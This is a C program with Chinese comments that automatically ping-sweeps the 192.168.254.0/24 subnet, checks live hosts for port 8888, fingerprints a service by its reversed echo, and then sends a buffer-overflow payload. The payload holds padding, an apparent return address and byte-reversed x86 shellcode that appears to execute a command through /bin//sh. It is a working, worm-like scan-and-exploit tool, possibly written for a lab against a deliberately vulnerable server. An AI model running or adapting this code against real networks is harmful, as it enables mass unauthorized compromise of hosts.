#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/ip_icmp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h> 
#include <unistd.h>

#define PORT 8888								/*侦听端口地址*/

/* CRC16校验和计算icmp_cksum */
static unsigned short icmp_cksum(unsigned char *data,  int len)
{
	int sum=0;							/*计算结果*/
	int odd = len & 0x01;					/*是否为奇数*/
	/*将数据按照2字节为单位累加起来*/
	while( len & 0xfffe)  {
		sum += *(unsigned short*)data;
		data += 2;
		len -=2;
	}
	/*判断是否为奇数个数据，若ICMP报头为奇数个字节，会剩下最后一字节*/
	if( odd) {
		unsigned short tmp = ((*data)<<8)&0xff00;
		sum += tmp;
	}
	sum = (sum >>16) + (sum & 0xffff);	/*高低位相加*/
	sum += (sum >>16) ;					/*将溢出位加入*/
	
	return ~sum; 							/*返回取反值*/
}


/* 设置ICMP回显请求包 */
static void icmp_pack(struct icmp *icmph, int length)
{
	unsigned char i = 0;
	/*设置报头*/
	icmph->icmp_type = ICMP_ECHO;		/*ICMP回显请求*/
	icmph->icmp_code = 0;				/*code值为0*/
	icmph->icmp_cksum = 0;	 		 	/*先将cksum值填写0，便于之后的cksum计算*/
	icmph->icmp_seq = 1;				/*本报的序列号*/
	icmph->icmp_id = getpid() &0xffff;		/*填写PID*/
	for(i = 0; i< length; i++)
		icmph->icmp_data[i] = i;
										/*计算校验和*/
	icmph->icmp_cksum = icmp_cksum((unsigned char*)icmph, length);
}


/* 解析ICMP回显应答包 */
static int icmp_unpack(char *buf,int len, unsigned long src)
{
	int iphdrlen;
	struct ip *ip = NULL;
	struct icmp *icmp = NULL;
	
	ip=(struct ip *)buf; 					/*IP头部*/
	iphdrlen=ip->ip_hl*4;					/*IP头部长度*/
	icmp=(struct icmp *)(buf+iphdrlen);		/*ICMP段的地址*/

	if( (icmp->icmp_type==ICMP_ECHOREPLY) && ((unsigned long)ip->ip_src.s_addr == src) )	
	{
		return 1;
	}
	else
	{
		return 0;
	}
}


/* ping指定ip */
int search(char *ip)
{
	char send_buff[72];
	icmp_pack((struct icmp *)send_buff, 64);
	
	
	int rawsock = 0;		/*发送和接收线程需要的socket描述符*/	
	char protoname[]= "icmp";
	struct protoent *protocol = getprotobyname(protoname);	/*获取协议类型ICMP*/
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return 0;
	}

	rawsock = socket(AF_INET, SOCK_RAW,  protocol->p_proto);		
	if(rawsock < 0)
	{
		perror("socket");
		return 0;
	}
	
	
	struct sockaddr_in dest;		/*目的地址*/
	bzero(&dest, sizeof(dest));
	dest.sin_family = AF_INET;
	unsigned long inaddr = inet_addr(ip);
	memcpy((char*)&dest.sin_addr, &inaddr, sizeof(inaddr));
	
	
	int size = 1024;
	setsockopt(rawsock, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));	/*增大接收缓冲区，防止接收的包被覆盖*/
	size = sendto (rawsock,  send_buff, 64,  0,	(struct sockaddr *)&dest, sizeof(dest) );	/*发送给目的地址*/
	

	char recv_buff[2048];		
	
	struct timeval tv;	/*轮询等待时间*/
	tv.tv_usec = 500;
	tv.tv_sec = 0;
	fd_set  readfd;
	FD_ZERO(&readfd);
	FD_SET(rawsock, &readfd);
	
	int	ret = select(rawsock+1,&readfd, NULL, NULL, &tv);
	if(ret>0){
		int size = recv(rawsock, recv_buff,sizeof(recv_buff), 0);
		ret = icmp_unpack(recv_buff, size, inaddr);
		if(ret)
			return 1;
	}
	close(rawsock);
	return 0;
}




int isportopen(char *ip)
{

    int fd = 0;
    
    fd_set fdr, fdw;
    struct timeval timeout;
    int err = 0;
    int errlen = sizeof(err);

    fd = socket(AF_INET,SOCK_STREAM,0);
    if (fd < 0) {
        fprintf(stderr, "create socket failed,error:%s.\n", strerror(errno));
        return 0;
    }
	
	struct sockaddr_in  addr;
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    /*设置套接字为非阻塞*/
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags < 0) {
        fprintf(stderr, "Get flags error:%s\n", strerror(errno));
        close(fd);
        return 0;
    }
    flags |= O_NONBLOCK;
    if (fcntl(fd, F_SETFL, flags) < 0) {
        fprintf(stderr, "Set flags error:%s\n", strerror(errno));
        close(fd);
        return 0;
    }

    /*阻塞情况下linux系统默认超时时间为75s*/
    int rc = connect(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (rc != 0) {
        if (errno == EINPROGRESS) {
            //printf("Doing connection.\n");
            /*正在处理连接*/
            FD_ZERO(&fdr);
            FD_ZERO(&fdw);
            FD_SET(fd, &fdr);
            FD_SET(fd, &fdw);
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            rc = select(fd + 1, &fdr, &fdw, NULL, &timeout);
            //printf("rc is: %d\n", rc);
            /*select调用失败*/
            if (rc < 0) {
                fprintf(stderr, "connect error:%s\n", strerror(errno));
                close(fd);
                return 0;
            }

            /*连接超时*/
            if (rc == 0) {
                fprintf(stderr, "Connect timeout.\n");
                close(fd);
                return 0;
            }
            /*[1] 当连接成功建立时，描述符变成可写,rc=1*/
            if (rc == 1 && FD_ISSET(fd, &fdw)) {
                printf("Connect success!!!!!\n");
                close(fd);
                return 1;
            }
            /*[2] 当连接建立遇到错误时，描述符变为即可读，也可写，rc=2 遇到这种情况，可调用getsockopt函数*/
            if (rc == 2) {
                if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &errlen) == -1) {
                    fprintf(stderr, "getsockopt(SO_ERROR): %s", strerror(errno));
                    close(fd);
                    return 0;

                }

                if (err) {
                    errno = err;
                    fprintf(stderr, "connect error:%s\n", strerror(errno));
                    close(fd);
                    return 0;

                }
            }

        }
        fprintf(stderr, "connect failed, error:%s.\n", strerror(errno));
	close(fd);
        return 0;
    }
    close(fd);
    return 0;
}
	





/*客户端的处理过程*/
void process_conn_client(int s)
{	
	ssize_t size = 0;
	char buffer[1024]="abcde";	/*数据的缓冲区*/	
	char reverse_buffer[1024]="edcba";

	write(s, buffer, 1024);
	memset(buffer,0,1024);
	size = read(s, buffer, 1024);
	
	if(size > 0){	
		if(strncmp(buffer,reverse_buffer,5)==0){
			printf("CAN\n");
			printf("%s\n",reverse_buffer);				/*写到标准输出*/
		}else{
			printf("The host can't be exploited\n");
			return;	
		}
	}

	char buffer2[1024]={0};	/*数据的缓冲区*/
	strncpy(buffer2,"\xff\xff\xc8\x7c\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x80\xcd\x0b\xb0\xd2\x31\xe1\x89\x53\x51\x52\x50\xe2\x89\x6f\x68\x63\x65\x68\x20\x20\x20\x20\x68\x31\x30\x32\x22\x68\x31\x30\x33\x37\x68\x32\x30\x30\x35\x68\x3e\x22\x38\x30\x68\x79\x78\x6c\x3e\x68\x74\x78\x74\x2e\x68\x52\xd2\x31\xe1\x89\x51\xff\xff\x9c\xd2\xf1\x81\xff\xff\xff\xff\xb9\x50\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f\x68\x50\xc0\x31\x30\xc4\x83",116);
	write(s, buffer2, 1024);

}



int tryexp(char *ip)
{
	int s;			/*s为socket描述符*/
	s = socket(AF_INET, SOCK_STREAM, 0); 		/*建立一个流式套接字 */
	if(s < 0){			/*出错*/
		printf("socket error\n");
		return -1;
	}	
	

	
	struct sockaddr_in server_addr;			/*服务器地址结构*/
	bzero(&server_addr, sizeof(server_addr));	/*清零*/
	server_addr.sin_family = AF_INET;			/*协议族*/
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);	/*本地地址*/
	server_addr.sin_port = htons(PORT);			/*服务器端口*/
	
	/*将用户输入的字符串类型的IP地址转为整型*/
	inet_pton(AF_INET, ip, &server_addr.sin_addr);	
	/*连接服务器*/
	connect(s, (struct sockaddr*)&server_addr, sizeof(struct sockaddr));
	process_conn_client(s);						/*客户端处理过程*/
	close(s);							/*关闭连接*/
	return 0;
}




int main(){
	
	//扫描局域网192.168.254.0/24的存活主机
	char ip[16]={0};
	int ping_result[256]={0};

	for(int i=1;i<255;i++){
		sprintf(ip,"192.168.254.%d",i);
		ping_result[i]=search(ip);
		if(ping_result[i]){
			printf("ping %s success. check the port %d...\n",ip,PORT);
			ping_result[i]=isportopen(ip);
		}
	}

	printf("\nbegin to exploit...\n");
	for(int i=1;i<255;i++){
		sprintf(ip,"192.168.254.%d",i);
		if(ping_result[i]){
			tryexp(ip);
		}
	}	
	
	
	
	
}
	


